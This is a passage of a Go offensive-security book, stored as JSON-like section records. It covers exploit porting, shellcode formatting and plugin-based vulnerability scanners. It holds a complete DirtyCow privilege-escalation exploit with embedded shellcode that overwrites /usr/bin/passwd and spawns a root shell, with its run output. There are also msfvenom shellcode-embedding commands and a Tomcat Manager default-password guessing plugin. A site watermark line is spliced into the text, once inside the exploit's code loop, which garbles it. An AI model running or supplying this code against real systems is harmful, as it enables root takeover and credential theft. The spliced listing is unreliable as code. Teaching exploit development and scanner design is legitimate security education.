memory. As for\nprevious system calls, you can find the parameters needed for\nmapp() by searching the Linux documentation. You may notice\nthat the Go code issues a call to syscall.Syscall6() rather than\nsyscall.Syscall(). The Syscall6() function is used for system calls that\nexpect six input parameters, as is the case with mapp(). Lastly,\nthe code spins up a couple of threads, calling the madvise() and\nprocselfmem() functions concurrently ❺. As the race condition\nensues, you call your waitForWrite() function, which monitors for\nchanges to your SUID file, signals the threads to stop, and\nexecutes your malicious code.\nFor completeness, Listing 9-14 shows the entirety of the\nported Go code.\nvar mapp uintptr\nvar signals = make(chan bool, 2)\nconst SuidBinary = \"/usr/bin/passwd\"\nvar sc = []byte{\n0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n--snip--\n0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,\n}\nfunc madvise() {\nfor i := 0; i < 1000000; i++ {\nselect {\ncase <- signals:\nfmt.Println(\"madvise done\")\nreturn\ndefault:\nsyscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100),\nsyscall.MADV_DONTNEED)\n}\n}\n}\nfunc procselfmem(payload []byte) {\nf, err := os.OpenFile(\"/proc/self/mem\", syscall.O_RDWR, 0)\nif err != nil {\nlog.Fatal(err)\n}\nfor i := 0; i < 1000000; i++ {\nselect {\ncase <- signals:\nfmt.Println(\"procselfmem done\")\nreturn\ndefault:\nsyscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))\nf.Write(payload)\n}\n}\n}\nfunc waitForWrite() {\nbuf := make([]byte, len(sc))\nfor {\nf, err := os.Open(SuidBinary)\nif err != nil {\nlog.Fatal(err)\n}\nif _, err := f.Read(buf); err != nil {\nlog.Fatal(err)\n}\nf.Close()\nif bytes.Compare(buf, sc) == 0 {\nfmt.Printf(\"%s is overwritten\\n\", SuidBinary)\nbreak\n}\ntime.Sleep(1*time.Second)\n}\nsignals <- true\nsignals <- true\nfmt.Println(\"Popping root shell\")\nfmt.Println(\"Don't forget to restore /tmp/bak\\n\")\nattr := os.ProcAttr {\nFiles: []*os.File{os.Stdin, os.Stdout, os.Stderr},\n}\nproc, err := os.StartProcess(SuidBinary, nil, &attr)\nif err !=nil {\nlog.Fatal(err)\n}\nproc.Wait()\nos.Exit(0)\n}\nfunc main() {\nfmt.Println(\"DirtyCow root privilege escalation\")\nfmt.Printf(\"Backing up %s.. to /tmp/bak\\n\", SuidBinary)\nbackup := exec.Command(\"cp\", SuidBinary, \"/tmp/bak\")\nif err := backup.Run(); err != nil {\nlog.Fatal(err)\n}\nf, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)\nif err != nil {\nlog.Fatal(err)\n}\nst, err := f.Stat()\nif err != nil {\nlog.Fatal(err)\n}\nfmt.Printf(\"Size of binary: %d\\n\", st.Size())\npayload := make([]byte, st.Size())\nfor i, _ := range payload {\npayload[i] = 0x90\nHivaNetwork.Com\n}\nfor i, v := range sc {\npayload[i] = v\n}\nmapp, _, _ = syscall.Syscall6(\nsyscall.SYS_MMAP,\nuintptr(0),\nuintptr(st.Size()),\nuintptr(syscall.PROT_READ),\nuintptr(syscall.MAP_PRIVATE),\nf.Fd(),\n0,\n)\nfmt.Println(\"Racing, this may take a while..\\n\")\ngo madvise()\ngo procselfmem(payload)\nwaitForWrite()\n}\nListing 9-14: The complete Go port (/ch-9/dirtycow/main.go/)\nTo confirm that your code works, run it on your vulnerable\nhost. There’s nothing more satisfying than seeing a root shell.\nalice@ubuntu:~$ go run main.go\nDirtyCow root privilege escalation\nBacking up /usr/bin/passwd.. to /tmp/bak\nSize of binary: 47032\nRacing, this may take a while..\n/usr/bin/passwd is overwritten\nPopping root shell\nprocselfmem done\nDon't forget to restore /tmp/bak\nroot@ubuntu:/home/alice# id"
  },
  {
    "input": "Creating Shellcode in Go",
    "output": "uid=0(root) gid=1000(alice) groups=0(root),4(adm),1000(alice)\nAs you can see, a successful run of the program backs up\nthe /usr/bin/passwd file, races for control of the handle,\noverwrites the file location with the newly intended values,\nand finally produces a system shell. The output of the Linux id\ncommand confirms that the alice user account has been elevated\nto a uid=0 value, indicating root-level privilege.\nCREATING SHELLCODE IN GO\nIn the previous section, you used raw shellcode in valid ELF\nformat to overwrite a legitimate file with your malicious\nalternative. How might you generate that shellcode yourself?\nAs it turns out, you can use your typical toolset to generate\nGo-friendly shellcode.\nWe’ll show you how to do this with msfvenom, a command-\nline utility, but the integration techniques we’ll teach you\naren’t tool-specific. You can use several methods to work with\nexternal binary data, be it shellcode or something else, and\nintegrate it into your Go code. Rest assured that the following\npages deal more with common data representations than\nanything specific to a tool.\nThe Metasploit Framework, a popular exploitation and\npost-exploitation toolkit, ships with msfvenom, a tool that\ngenerates and transforms any of Metasploit’s available\npayloads to a variety of formats specified via the -f argument.\nUnfortunately, there is no explicit Go transform. However,\nyou can integrate several formats into your Go code fairly\neasily with minor adjustments. We’ll explore five of these\nformats here: C, hex, num, raw, and Base64, while keeping in\nmind that our end goal is to create a byte slice in Go.\nC Transform\nIf you specify a C transform type, msfvenom will produce the\npayload in a format that you can directly place into C code.\nThis may seem like the logical first choice, since we detailed\nmany of the similarities between C and Go earlier in this\nchapter. However, it’s not the best candidate for our Go code.\nTo show you why, look at the following sample output in C\nformat:\nunsigned char buf[] =\n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n--snip--\n\"\\x64\\x00\";\nWe’re interested almost exclusively in the payload. To\nmake it Go-friendly, you’ll have to remove the semicolon and\nalter the line breaks. This means you’ll either need to\nexplicitly append each line by adding a + to the end of all lines\nexcept the last, or remove the line breaks altogether to produce\none long, continuous string. For small payloads this may be\nacceptable, but for larger payloads this becomes tedious to do\nmanually. You’ll find yourself likely turning to other Linux\ncommands such as sed and tr to clean it up.\nOnce you clean up the payload, you’ll have your payload\nas a string. To create a byte slice, you’d enter something like\nthis:\npayload := []byte(\"\\xfc\\xe8\\x82...\").\nIt’s not a bad solution, but you can do better.\nHex Transform\nImproving upon the previous attempt, let’s look at a hex\ntransform. With this format, msfvenom produces a long,\ncontinuous string of hexadecimal characters:\nfce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ff...6400\nIf this format looks familiar, it’s because you used it when\nporting the Java deserialization exploit. You passed this value\nas a string into a call to hex.DecodeString(). It returns a byte slice\nand error details, if present. You could use it like so:\npayload, err :=\nhex.DecodeString(\"fce8820000006089e531c0648b50308b520c8b52148b\n72280fb74a2631ff...6400\")\nTranslating this to Go is pretty simple. All you have to do\nis wrap your string in double quotes and pass it to the function.\nHowever, a large payload will produce a string that may not be\naesthetically pleasing, wrapping lines or running beyond\nrecommended page margins. You may still want to use this\nformat, but we’ve provided a third alternative in the event that\nyou want your code to be both functional and pretty.\nNum Transform\nA num transform produces a comma-separated list of bytes in\nnumerical, hexadecimal format:\n0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b,\n0x50, 0x30,\n0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26,\n0x31, 0xff,\n--snip--\n0x64, 0x00\nYou can use this output in the direct initialization of a byte\nslice, like so:\npayload := []byte{\n0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b,\n0x50, 0x30,\n0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26,\n0x31, 0xff,\n--snip--\n0x64, 0x00,\n}\nBecause the msfvenom output is comma-separated, the list of\nbytes can wrap nicely across lines without clumsily appending\ndata sets. The only modification required is the addition of a\nsingle comma after the last element in the list. This output\nformat is easily integrated into your Go code and formatted\npleasantly.\nRaw Transform\nA raw transform produces the payload in raw binary format.\nThe data itself, if displayed on the terminal window, likely\nproduces unprintable characters that look something like this:\nÐÐÐ`ÐÐ1ÐdÐP0ÐR\nÐ8ÐuÐ}Ð;}$uÐXÐX$ÐfÐY IÐ:IÐ4ÐÐ1ÐÐÐÐ\nYou can’t use this data in your code unless you produce it\nin a different format. So why, you may ask, are we even\ndiscussing raw binary data? Well, because it’s fairly common\nto encounter raw binary data, whether as a payload generated\nfrom a tool, the contents of a binary file, or crypto keys.\nKnowing how to recognize binary data and work it into your\nGo code will prove valuable.\nUsing the xxd utility in Linux with the -i command line\nswitch, you can easily transform your raw binary data into the\nnum format of the previous section. A sample msfvenom\ncommand would look like this, where you pipe the raw binary\noutput produced by msfvenom into the xxd command:\n$ msfvenom -p [payload] [options] - f raw | xxd -i\nYou can assign the result directly to a byte slice as\ndemonstrated in the previous section.\nBase64 Encoding\nAlthough msfvenom doesn’t include a pure Base64 encoder, it’s\nfairly common to encounter binary data, including shellcode,\nin Base64 format. Base64 encoding extends the length of your\ndata, but also allows you to avoid ugly or unusable raw binary\ndata. This format is easier to work with in your code than num,\nfor example, and can simplify data transmission over protocols\nsuch as HTTP. For that reason, it’s worth discussing its usage\nin Go.\nThe easiest method to produce a Base64-encoded\nrepresentation of binary data is to use the base64 utility in\nLinux. It allows you to encode or decode data via stdin or from\na file. You could use msfvenom to produce raw binary data, and\nthen encode the result by using the following command:\n$ msfvenom -p [payload] [options] - f raw | base64\nMuch like your C output, the resulting payload contains\nline breaks that you’ll have to deal with before including it as\na string in your code. You can use the tr utility in Linux to\nclean up the output, removing all line breaks:\n$ msfvenom -p [payload] [options] - f raw | base64 | tr -d \"\\n\"\nThe encoded payload will now exist as a single, continuous\nstring. In your Go code, you can then get the raw payload as a\nbyte slice by decoding the string. You use the encoding/base64\npackage to get the job done:\npayload, err :=\nbase64.StdEncoding.DecodeString(\"/OiCAAAAYInlMcBki1Awi...WFuZAA=\")\nYou’ll now have the ability to work with the raw binary\ndata without all the ugliness.\nA Note on Assembly\nA discussion of shellcode and low-level programming isn’t\ncomplete without at least mentioning assembly. Unfortunately\nfor the shellcode composers and assembly artists, Go’s\nintegration with assembly is limited. Unlike C, Go doesn’t\nsupport inline assembly. If you want to integrate assembly into\nyour Go code, you can do that, sort of. You’ll have to\nessentially define a function prototype in Go with the\nassembly instructions in a separate file. You then run go build to\ncompile, link, and build your final executable. While this may\nnot seem overly daunting, the problem is the assembly\nlanguage itself. Go supports only a variation of assembly\nbased on the Plan 9 operating system. This system was created\nby Bell Labs and used in the late 20th century. The assembly"
  },
  {
    "input": "Summary",
    "output": "syntax, including available instructions and opcodes, is almost\nnonexistent. This makes writing pure Plan 9 assembly a\ndaunting, if not nearly impossible, task.\nSUMMARY\nDespite lacking assembly usability, Go’s standard packages\noffer a tremendous amount of functionality conducive to\nvulnerability hunters and exploit developers. This chapter\ncovered fuzzing, porting exploits, and handling binary data\nand shellcode. As an additional learning exercise, we\nencourage you to explore the exploit database at\nhttps://www.exploit-db.com/ and try to port an existing exploit\nto Go. Depending on your comfort level with the source\nlanguage, this task could seem overwhelming but it can be an\nexcellent opportunity to understand data manipulation,\nnetwork communications, and low-level system interaction.\nIn the next chapter, we’ll step away from exploitation\nactivities and focus on producing extendable toolsets."
  },
  {
    "input": "10 GO PLUGINS AND EXTENDABLE TOOLS",
    "output": "10\nGO PLUGINS AND EXTENDABLE\nTOOLS\nMany security tools are constructed as frameworks—core\ncomponents, built with a level of abstraction that allows you to\neasily extend their functionality. If you think about it, this\nmakes a lot of sense for security practitioners. The industry is\nconstantly changing; the community is always inventing new\nexploits and techniques to avoid detection, creating a highly\ndynamic and somewhat unpredictable landscape. However, by\nusing plug-ins and extensions, tool developers can future-\nproof their products to a degree. By reusing their tools’ core\ncomponents without making cumbersome rewrites, they can\nhandle industry evolution gracefully through a pluggable\nsystem.\nThis, coupled with massive community involvement, is\narguably how the Metasploit Framework has managed to age\nso well. Hell, even commercial enterprises like Tenable see the\nvalue in creating extendable products; Tenable relies on a\nplug-in-based system to perform signature checks within its"
  },
  {
    "input": "Using Go’s Native Plug-in System",
    "output": "Nessus vulnerability scanner.\nIn this chapter, you’ll create two vulnerability scanner\nextensions in Go. You’ll first do this by using the native Go\nplug-in system and explicitly compiling your code as a shared\nobject. Then you’ll rebuild the same plug-in by using an\nembedded Lua system, which predates the native Go plug-in\nsystem. Keep in mind that, unlike creating plug-ins in other\nlanguages, such as Java and Python, creating plug-ins in Go is\na fairly new construct. Native support for plug-ins has existed\nonly since Go version 1.8. Further, it wasn’t until Go version\n1.10 that you could create these plug-ins as Windows dynamic\nlink libraries (DLLs). Make sure you’re running the latest\nversion of Go so that all the examples in this chapter work as\nplanned.\nUSING GO’S NATIVE PLUG-IN\nSYSTEM\nPrior to version 1.8 of Go, the language didn’t support plug-\nins or dynamic runtime code extendibility. Whereas languages\nlike Java allow you to load a class or JAR file when you\nexecute your program to instantiate the imported types and call\ntheir functions, Go provided no such luxury. Although you\ncould sometimes extend functionality through interface\nimplementations and such, you couldn’t truly dynamically\nload and execute the code itself. Instead, you needed to\nproperly include it during compile time. As an example, there\nwas no way to replicate the Java functionality shown here,\nwhich dynamically loads a class from a file, instantiates the\nclass, and calls someMethod() on the instance:\nHivaNetwork.Com\nFile file = new File(\"/path/to/classes/\");\nURL[] urls = new URL[]{file.toURL()};\nClassLoader cl = new URLClassLoader(urls);\nClass clazz = cl.loadClass(\"com.example.MyClass\");\nclazz.getConstructor().newInstance().someMethod();\nLuckily, the later versions of Go have the ability to mimic\nthis functionality, allowing developers to compile code\nexplicitly for use as a plug-in. Limitations exist, though.\nSpecifically, prior to version 1.10, the plug-in system worked\nonly on Linux, so you’d have to deploy your extendable\nframework on Linux.\nGo’s plug-ins are created as shared objects during the\nbuilding process. To produce this shared object, you enter the\nfollowing build command, which supplies plugin as the buildmode\noption:\n$ go build -buildmode=plugin\nAlternatively, to build a Windows DLL, use c-shared as the\nbuildmode option:\n$ go build -buildmode=c-shared\nTo build a Windows DLL, your program must meet certain\nconventions to export your functions and also must import the\nC library. We’ll let you explore these details on your own.\nThroughout this chapter, we’ll focus almost exclusively on the\nLinux plug-in variant, since we’ll demonstrate how to load and\nuse DLLs in Chapter 12.\nAfter you’ve compiled to a DLL or shared object, a\nseparate program can load and use the plug-in at runtime. Any\nof the exported functions will be accessible. To interact with\nthe exported features of a shared object, you’ll use Go’s plugin\npackage. The functionality in the package is straightforward.\nTo use a plug-in, follow these steps:\n1. Call plugin.Open(filename string) to open a shared object file, creating a\n*plugin.Plugin instance.\n2. On the *plugin.Plugin instance, call Lookup(symbolName string) to retrieve a\nSymbol (that is, an exported variable or function) by name.\n3. Use a type assertion to convert the generic Symbol to the type expected by your\nprogram.\n4. Use the resulting converted object as desired.\nYou may have noticed that the call to Lookup() requires the\nconsumer to supply a symbol name. This means that the\nconsumer must have a predefined, and hopefully publicized,\nnaming scheme. Think of it as almost a defined API or generic\ninterface to which plug-ins will be expected to adhere.\nWithout a standard naming scheme, new plug-ins would\nrequire you to make changes to the consumer code, defeating\nthe entire purpose of a plug-in-based system.\nIn the examples that follow, you should expect plug-ins to\ndefine an exported function named New() that returns a specific\ninterface type. That way, you’ll be able to standardize the\nbootstrapping process. Getting a handle back to an interface\nallows us to call functions on the object in a predictable way.\nNow let’s start creating your pluggable vulnerability\nscanner. Each plug-in will implement its own signature-\nchecking logic. Your main scanner code will bootstrap the\nprocess by reading your plug-ins from a single directory on\nyour filesystem. To make this all work, you’ll have two\nseparate repositories: one for your plug-ins and one for the\nmain program that consumes the plug-ins.\nCreating the Main Program\nCreating the Main Program\nLet’s start with your main program, to which you’ll attach\nyour plug-ins. This will help you understand the process of\nauthoring your plug-ins. Set up your repository’s directory\nstructure so it matches the one shown here:\n$ tree\n.\n--- cmd\n--- scanner\n--- main.go\n--- plugins\n--- scanner\n--- scanner.go\nThe file called cmd/scanner/main.go is your command line\nutility. It will load the plug-ins and initiate a scan. The plugins\ndirectory will contain all the shared objects that you’ll load\ndynamically to call various vulnerability signature checks.\nYou’ll use the file called scanner/scanner.go to define the data\ntypes your plug-ins and main scanner will use. You put this\ndata into its own package to make it a little bit easier to use.\nListing 10-1 shows what your scanner.go file looks like.\n(All the code listings at the root location of / exist under the\nprovided github repo https://github.com/blackhat-go/bhg/.)\npackage scanner\n// Scanner defines an interface to which all checks adhere\n❶ type Checker interface {\n❷ Check(host string, port uint64) *Result\n}\n// Result defines the outcome of a check\n❸ type Result struct {\nVulnerable bool\nDetails string\n}\nListing 10-1: Defining core scanner types (/ch-10/plugin-core/scanner/scanner.go)\nIn this package, named scanner, you define two types. The\nfirst is an interface called Checker ❶. The interface defines a\nsingle method named Check() ❷, which accepts a host and port\nvalue and returns a pointer to a Result. Your Result type is\ndefined as a struct ❸. Its purpose is to track the outcome of the\ncheck. Is the service vulnerable? What details are pertinent in\ndocumenting, validating, or exploiting the flaw?\nYou’ll treat the interface as a contract or blueprint of sorts;\na plug-in is free to implement the Check() function however it\nchooses, so long as it returns a pointer to a Result. The logic of\nthe plug-in’s implementation will vary based on each plug-in’s\nvulnerability-checking logic. For instance, a plug-in checking\nfor a Java deserialization issue can implement the proper\nHTTP calls, whereas a plug-in checking for default SSH\ncredentials can issue a password-guessing attack against the\nSSH service. The power of abstraction!\nNext, let’s review cmd/scanner/main.go, which will\nconsume your plug-ins (Listing 10-2).\nconst PluginsDir = \"../../plugins/\" ❶\nfunc main() {\nvar (\nfiles []os.FileInfo\nerr error\np *plugin.Plugin\nn plugin.Symbol\ncheck scanner.Checker\nres *scanner.Result\n)\nif files, err = ioutil.ReadDir(PluginsDir)❷; err != nil {\nlog.Fatalln(err)\n}\nfor idx := range files { ❸\nfmt.Println(\"Found plugin: \" + files[idx].Name())\nif p, err = plugin.Open(PluginsDir + \"/\" + files[idx].Name())❹; err != nil {\nlog.Fatalln(err)\n}\nif n, err = p.Lookup(\"New\")❺; err != nil {\nlog.Fatalln(err)\n}\nnewFunc, ok := n.(func() scanner.Checker) ❻\nif !ok {\nlog.Fatalln(\"Plugin entry point is no good. Expecting: func New()\nscanner.Checker{ ... }\")\n}\ncheck = newFunc()❼\nres = check.Check(\"10.0.1.20\", 8080) ❽\nif res.Vulnerable { ❾\nlog.Println(\"Host is vulnerable: \" + res.Details)\n} else {\nlog.Println(\"Host is NOT vulnerable\")\n}\n}\n}\nListing 10-2: The scanner client that runs plug-ins (/ch-10/plugin-\ncore/cmd/scanner/main.go)\nThe code starts by defining the location of your plug-ins\n❶. In this case, you’ve hardcoded it; you could certainly\nimprove the code so it reads this value in as an argument or\nenvironment variable instead. You use this variable to call\nioutil.ReadDir(PluginDir) and obtain a file listing ❷, and then loop\nover each of these plug-in files ❸. For each file, you use Go’s\nplugin package to read the plug-in via a call to plugin.Open() ❹. If\nthis succeeds, you’re given a *plugin.Plugin instance, which you\nassign to the variable named p. You call p.Lookup(\"New\") to\nsearch your plug-in for a symbol named New ❺.\nAs we mentioned during the high-level overview earlier,\nthis symbol lookup convention requires your main program to\nprovide the explicit name of the symbol as an argument,\nmeaning you expect the plug-in to have an exported symbol by\nthe same name—in this case, our main program is looking for\nthe symbol named New. Furthermore, as you’ll see shortly, the\ncode expects the symbol to be a function that will return a\nconcrete implementation of your scanner.Checker interface, which\nwe discussed in the previous section.\nAssuming your plug-in contains a symbol named New, you\nmake a type assertion for the symbol as you try to convert it to\ntype func() scanner.Checker ❻. That is, you’re expecting the\nsymbol to be a function that returns an object implementing\nscanner.Checker. You assign the converted value to a variable\nnamed newFunc. Then you invoke it and assign the returned\nvalue to a variable named check ❼. Thanks to your type\nassertion, you know that check satisfies your scanner.Checker\ninterface, so it must implement a Check() function. You call it,\npassing in a target host and port ❽. The result, a *scanner.Result,\nis captured using a variable named res and inspected to\ndetermine whether the service was vulnerable or not ❾.\nNotice that this process is generic; it uses type assertions\nand interfaces to create a construct through which you can\ndynamically call plug-ins. Nothing within the code is specific\nto a single vulnerability signature or method used to check for\na vulnerability’s existence. Instead, you’ve abstracted the\nfunctionality enough that plug-in developers can create stand-\nalone plug-ins that perform units of work without having\nknowledge of other plug-ins—or even extensive knowledge of\nthe consuming application. The only thing that plug-in authors\nmust concern themselves with is properly creating the\nexported New() function and a type that implements\nscanner.Checker. Let’s have a look at a plug-in that does just that.\nBuilding a Password-Guessing Plug-in\nThis plug-in (Listing 10-3) performs a password-guessing\nattack against the Apache Tomcat Manager login portal. A\nfavorite target for attackers, the portal is commonly configured\nto accept easily guessable credentials. With valid credentials,\nan attacker can reliably execute arbitrary code on the\nunderlying system. It’s an easy win for attackers.\nIn our review of the code, we won’t cover the specific\ndetails of the vulnerability test, as it’s really just a series of\nHTTP requests issued to a specific URL. Instead, we’ll focus\nprimarily on satisfying the pluggable scanner’s interface\nrequirements.\nimport (\n// Some snipped for brevity\n\"github.com/bhg/ch-10/plugin-core/scanner\" ❶\n)\nvar Users = []string{\"admin\", \"manager\", \"tomcat\"}\nvar Passwords = []string{\"admin\", \"manager\", \"tomcat\", \"password\"}\n// TomcatChecker implements the scanner.Check interface. Used for guessing\nTomcat creds\ntype TomcatChecker struct{} ❷\n// Check attempts to identify guessable Tomcat credentials\nfunc (c *TomcatChecker) Check(host string, port uint64) *scanner.Result { ❸\nvar (\nresp *http.Response\nerr error\nurl string\nres *scanner.Result\nclient *http.Client\nreq *http.Request\n)\nlog.Println(\"Checking for Tomcat Manager...\")\nres = new(scanner.Result) ❹\nurl = fmt.Sprintf(\"http://%s:%d/manager/html\", host, port)\nif resp, err = http.Head(url); err != nil {\nlog.Printf(\"HEAD request failed: %s\\n\", err)\nreturn res\n}\nlog.Println(\"Host responded to /manager/html request\")\n// Got a response back, check if authentication required\nif resp.StatusCode != http.StatusUnauthorized ||\nresp.Header.Get(\"WWW-Authenticate\") == \"\" {\nlog.Println(\"Target doesn't appear to require Basic auth.\")\nreturn res\n}\n// Appears authentication is required. Assuming Tomcat manager. Guess\npasswords...\nlog.Println(\"Host requires authentication. Proceeding with password\nguessing...\")\nclient = new(http.Client)\nif req, err = http.NewRequest(\"GET\", url, nil); err != nil {\nlog.Println(\"Unable to build GET request\")\nreturn res\n}\nfor _, user := range Users {\nfor _, password := range Passwords {\nreq.SetBasicAuth(user, password)\nif resp, err = client.Do(req); err != nil {\nlog.Println(\"Unable to send GET request\")\ncontinue\n}\nif resp.StatusCode == http.StatusOK { ❺\nres.Vulnerable = true\nres.Details = fmt.Sprintf(\"Valid credentials found - %s:%s\", user,\npassword)\nreturn res\n}\n}\n}\nreturn res\n}\n// New is the entry point required by the scanner\nfunc New() scanner.Checker { ❻\nreturn new(TomcatChecker)\n}\nListing 10-3: Creating a Tomcat credential-guessing plug-in natively (/ch-\n10/plugin-tomcat/main.go)\nFirst, you need to import the scanner package we detailed\npreviously ❶. This package defines both the Checker interface\nand the Result struct that you’ll be building. To create an\nimplementation of Checker, you start by defining an empty struct\ntype named TomcatChecker ❷. To fulfill the Checker interface’s\nimplementation requirements, you create a method matching\nthe required Check(host string, port uint64) *scanner.Result function\nsignature ❸. Within this method, you perform all of your\ncustom vulnerability-checking logic.\nSince you’re expected to return a *scanner.Result, you\ninitialize one, assigning it to a variable named res ❹. If the\nconditions are met—that is, if the checker verifies the\nguessable credentials—and the vulnerability is confirmed ❺,\nyou set res.Vulnerable to true and set res.Details to a message\ncontaining the identified credentials. If the vulnerability isn’t\nidentified, the instance returned will have res.Vulnerable set to its\ndefault state—false.\nLastly, you define the required exported function New()\n*scanner.Checker ❻. This adheres to the expectations set by your\nscanner’s Lookup() call, as well as the type assertion and\nconversion needed to instantiate the plug-in-defined\nTomcatChecker. This basic entry point does nothing more than\nreturn a new *TomcatChecker (which, since it implements the\nrequired Check() method, happens to be a scanner.Checker).\nRunning the Scanner\nNow that you’ve created both your plug-in and the main\nprogram that consumes it, compile your plug-in, using the -o\noption to direct your compiled shared object to the scanner’s\nplug-ins directory:\n$ go build -buildmode=plugin -o /path/to/plugins/tomcat.so\nThen run your scanner (cmd/scanner/main.go) to confirm\nthat it identifies the plug-in, loads it, and executes the plug-\nin’s Check() method:\n$ go run main.go\nFound plugin: tomcat.so\n2020/01/15 15:45:18 Checking for Tomcat Manager...\n2020/01/15 15:45:18 Host responded to /manager/html request\n2020/01/15 15:45:18 Host requires authentication. Proceeding with password\nguessing...\n2020/01/15 15:45:18 Host is vulnerable: Valid credentials found - tomcat:tomcat\nHivaNetwork.Com"
  },
  {
    "input": "Building Plug-ins in Lua",
    "output": "Would you look at that? It works! Your scanner is able to\ncall code within your plug-in. You can drop any number of\nother plug-ins into the plug-ins directory. Your scanner will\nattempt to read each and kick off the vulnerability-checking\nfunctionality.\nThe code we developed could benefit from a number of\nimprovements. We’ll leave these improvements to you as an\nexercise. We encourage you to try a few things:\n1. Create a plug-in to check for a different vulnerability.\n2. Add the ability to dynamically supply a list of hosts and their open ports for\nmore extensive tests.\n3. Enhance the code to call only applicable plug-ins. Currently, the code will call\nall plug-ins for the given host and port. This isn’t ideal. For example, you\nwouldn’t want to call the Tomcat checker if the target port isn’t HTTP or\nHTTPS.\n4. Convert your plug-in system to run on Windows, using DLLs as the plug-in\ntype.\nIn the next section, you’ll build the same vulnerability-\nchecking plug-in in a different, unofficial plug-in system: Lua.\nBUILDING PLUG-INS IN LUA\nUsing Go’s native buildmode feature when creating pluggable\nprograms has limitations, particularly because it’s not very\nportable, meaning the plug-ins may not cross-compile nicely.\nIn this section, we’ll look at a way to overcome this deficiency\nby creating plug-ins with Lua instead. Lua is a scripting\nlanguage used to extend various tools. The language itself is\neasily embeddable, powerful, fast, and well-documented.\nSecurity tools such as Nmap and Wireshark use it for creating\nplug-ins, much as you’ll do right now. For more info, refer to\nthe official site at https://www.lua.org/.\nTo use Lua within Go, you’ll use a third-party package,\ngopher-lua, which is capable of compiling and executing Lua\nscripts directly in Go. Install it on your system by entering the\nfollowing:\n$ go get github.com/yuin/gopher-lua\nNow, be forewarned that the price you’ll pay for portability\nis increased complexity. That’s because Lua has no implicit\nway to call functions in your program or various Go packages\nand has no knowledge of your data types. To solve this\nproblem, you’ll have to choose one of two design patterns:\n1. Call a single entry point in your Lua plug-in, and let the plug-in call any helper\nmethods (such as those needed to issue HTTP requests) through other Lua\npackages. This makes your main program simple, but it reduces portability and\ncould make dependency management a nightmare. For example, what if a Lua\nplug-in requires a third-party dependency not installed as a core Lua package?\nYour plug-in would break the moment you move it to another system. Also,\nwhat if two separate plug-ins require different versions of a package?\n2. In your main program, wrap the helper functions (such as those from the net/http\npackage) in a manner that exposes a façde through which the plug-in can\ninteract. This, of course, requires you to write extensive code to expose all the\nGo functions and types. However, once you’ve written the code, the plug-ins can\nreuse it in a consistent manner. Plus, you can sort of not worry about the Lua\ndependency issues that you’d have if you used the first design pattern (although,\nof course, there’s always the chance that a plug-in author uses a third-party\nlibrary and breaks something).\nFor the remainder of this section, you’ll work on the\nsecond design pattern. You’ll wrap your Go functions to\nexpose a façde that’s accessible to your Lua plug-ins. It’s the\nbetter of the two solutions (and plus, the word façde makes it\nsound like you’re building something really fancy).\nThe bootstrapping, core Go code that loads and runs plug-\nins will reside in a single file for the duration of this exercise.\nFor the sake of simplicity, we’ve specifically removed some of\npatterns used in the examples at\nhttps://github.com/yuin/gopher-lua/. We felt that some of the\npatterns, such as using user-defined types, made the code less\nreadable. In a real implementation, you’d likely want to\ninclude some of those patterns for better flexibility. You’d also\nwant to include more extensive error and type checking.\nYour main program will define functions to issue GET and\nHEAD HTTP requests, register those functions with the Lua\nvirtual machine (VM), and load and execute your Lua scripts\nfrom a defined plug-ins directory. You’ll build the same\nTomcat password-guessing plug-in from the previous section,\nso you’ll be able to compare the two versions.\nCreating the head() HTTP Function\nLet’s start with the main program. First, let’s look at the head()\nHTTP function, which wraps calls to Go’s net/http package\n(Listing 10-4).\nfunc head(l *lua.LState❶) int {\nvar (\nhost string\nport uint64\npath string\nresp *http.Response\nerr error\nurl string\n)\n❷ host = l.CheckString(1)\nport = uint64(l.CheckInt64(2))\npath = l.CheckString(3)\nurl = fmt.Sprintf(\"http://%s:%d/%s\", host, port, path)\nif resp, err = http.Head(url); err != nil {\n❸ l.Push(lua.LNumber(0))\nl.Push(lua.LBool(false))\nl.Push(lua.LString(fmt.Sprintf(\"Request failed: %s\", err)))\n❹ return 3\n}\n❺ l.Push(lua.LNumber(resp.StatusCode))\nl.Push(lua.LBool(resp.Header.Get(\"WWW-Authenticate\") != \"\"))\nl.Push(lua.LString(\"\"))\n❻ return 3\n}\nListing 10-4: Creating a head() function for Lua (/ch-10/lua-\ncore/cmd/scanner/main.go)\nFirst, notice that your head() function accepts a pointer to a\nlua.LState object and returns an int ❶. This is the expected\nsignature for any function you wish to register with the Lua\nVM. The lua.LState type maintains the running state of the VM,\nincluding any parameters passed in to Lua and returned from\nGo, as you’ll see shortly. Since your return values will be\nincluded within the lua.LState instance, the int return type\nrepresents the number of values returned. That way, your Lua\nplug-in will be able to read and use the return values.\nSince the lua.LState object, l, contains any parameters passed\nto your function, you read the data in via calls to l.CheckString()\nand l.CheckInt64() ❷. (Although not needed for our example,\nother Check* functions exist to accommodate other expected\ndata types.) These functions receive an integer value, which\nacts as the index for the desired parameter. Unlike Go slices,\nwhich are 0-indexed, Lua is 1-indexed. So, the call to\nl.CheckString(1) retrieves the first parameter supplied in the Lua\nfunction call, expecting it to be a string. You do this for each\nof your expected parameters, passing in the proper index of the\nexpected value. For your head() function, you’re expecting Lua\nto call head(host, port, path), where host and path are strings and port\nis an integer. In a more resilient implementation, you’d want\nto do additional checking here to make sure the data supplied\nis 